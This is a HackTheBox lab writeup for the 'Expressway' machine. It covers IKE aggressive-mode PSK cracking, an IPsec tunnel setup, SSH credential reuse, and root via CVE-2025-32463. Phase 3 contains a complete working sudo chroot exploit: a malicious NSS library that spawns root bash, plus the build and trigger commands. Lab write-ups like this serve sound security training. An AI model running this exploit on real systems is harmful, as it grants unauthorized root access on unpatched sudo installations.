---
title: "Expressway — HackTheBox Writeup"
date: "2026-02-26"
description: "Medium Linux machine involving IKEv1 aggressive mode PSK cracking, IPsec VPN tunnel establishment, and CVE-2025-32463 sudo chroot NSS library injection"
tags: ['hackthebox', 'writeup', 'linux', 'CVE', 'ipsec', 'vpn', 'privilege escalation']
thumbnail: ""
---

# Expressway — HTB Labs Machine Writeup

**Difficulty:** Medium
**OS:** Linux (Debian)

---

## Attack Chain Summary

```
UDP 500 IKE Aggressive Mode → PSK hash leaked
    → psk-crack → freakingrockstarontheroad
        → strongSwan IKEv1 tunnel → SSH unlocked
            → Credential reuse (PSK = SSH password)
                → linpeas: /usr/local/bin/sudo v1.9.17 SUID
                    → CVE-2025-32463 NSS chroot injection → Root
```

---

## Phase 1: Reconnaissance

### Port Scan

```bash
nmap -sC -sV -Pn 10.129.238.52        # TCP
sudo nmap -sU --top-ports 100 10.129.238.52  # UDP
```

| Port | State | Service |
|------|-------|---------|
| 22/tcp | open | SSH (OpenSSH 10.0p2) — "Not allowed at this time" |
| 500/udp | open | ISAKMP (IKE) |

SSH rejected connections with "Not allowed at this time" — indicating IP/network-based access control. The VPN must be established first.

### IKE Enumeration

```bash
ike-scan -M --aggressive --id=vpn 10.129.238.52
```

Server leaked its identity: `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)` and returned a crackable PSK hash.

IKE proposal: `Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK`

---

## Phase 2: Foothold

### PSK Cracking

```bash
ike-scan -M --aggressive --id=vpn --pskcrack=ike-hash.txt 10.129.238.52
psk-crack -d /usr/share/wordlists/rockyou.txt ike-hash.txt
```

**Cracked PSK**: `freakingrockstarontheroad`

### IPsec VPN Tunnel

Configured strongSwan with the exact cipher suite from the IKE proposal:

```ini
# /etc/ipsec.conf
conn expressway
    keyexchange=ikev1
    type=tunnel
    left=%defaultroute
    leftid=ike@expressway.htb
    leftauth=psk
    right=10.129.238.52
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    aggressive=yes
    auto=add
```

```bash
sudo ipsec restart && sudo ipsec up expressway
```

### SSH Access — Credential Reuse

With the VPN active, SSH accepted connections. The IKE PSK was reused as the SSH password:

```bash
ssh ike@10.129.238.52
# Password: freakingrockstarontheroad
```

```
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

---

## Phase 3: Privilege Escalation — CVE-2025-32463

### Key Findings from Enumeration

| Finding | Detail |
|---------|--------|
| Custom SUID sudo | `/usr/local/bin/sudo` v1.9.17 — root-owned SUID, non-stripped |
| TFTP service | Serving Cisco router config with cleartext VPN group key |
| Compilers | `gcc`, `g++`, `python3`, `perl` — all present |

### CVE-2025-32463 — Sudo Chroot NSS Library Injection

The custom SUID binary `/usr/local/bin/sudo` was version **1.9.17**, vulnerable to **CVE-2025-32463**: sudo's `-R` (`--chroot`) option resolves `nsswitch.conf` from inside the attacker-controlled chroot directory while root privileges are already effective.

**Affected versions**: Sudo 1.9.14 through 1.9.17

### Exploit

```bash
#!/bin/bash
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

# Malicious NSS library — spawns bash as root on load
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/bash","/bin/bash",NULL);
}
EOF

# Build chroot with poisoned nsswitch.conf
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc

# Compile malicious libnss
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

sudo -R woot woot
```

```
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

---

## Failed Attempts

| # | What Was Tried | Why It Failed |
|---|----------------|---------------|
| 1 | strongSwan `type=transport` | Server returned INVALID_ID_INFORMATION — tunnel mode required |
| 2 | Exim4 SUID escalation | Very recent version (4.98.2), no public PoC |
| 3 | Squid proxy log analysis | Logs readable but no useful credentials |

---

## Key Takeaways

1. **Always run UDP scans** — Missing UDP 500 means missing the entire attack path.

2. **IKEv1 Aggressive Mode leaks PSK hashes** — Unlike Main Mode, Aggressive Mode sends the hash before authentication completes.

3. **Credential reuse across services** — The IKE PSK doubled as the SSH password.

4. **Custom SUID binaries are deliberate signals** — Non-standard path + non-stripped binary = check for version-specific CVEs.

5. **CVE-2025-32463**: Sudo 1.9.14-1.9.17 loads `nsswitch.conf` from an attacker-controlled chroot with root context active. Requires `gcc` on target.

---

## Tools Used

- `nmap` — TCP/UDP port scanning
- `ike-scan` — IKE enumeration and PSK hash extraction
- `psk-crack` — Offline PSK cracking
- `strongswan` / `ipsec` — VPN tunnel establishment
- `linpeas` — Privilege escalation enumeration
- `gcc` — Compile malicious NSS shared library
